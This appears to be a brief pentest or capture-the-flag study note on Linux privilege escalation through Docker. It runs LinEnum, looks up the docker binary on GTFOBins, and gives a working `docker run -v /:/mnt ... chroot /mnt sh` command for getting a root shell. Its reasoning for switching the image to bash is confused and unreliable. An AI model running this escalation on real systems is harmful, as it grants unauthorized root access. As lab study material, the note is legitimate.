## Escalation via Docker

First get into a low privilaged user.

Export LinEnum and exeute this tmp.

Check the result to find docker.

search docker gtfobins. 

We are in shell we can run `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` but our shell is bash so we need to change the above command to `docker run -v /:/mnt --rm -it bash chroot /mnt sh`

Then we will be in root.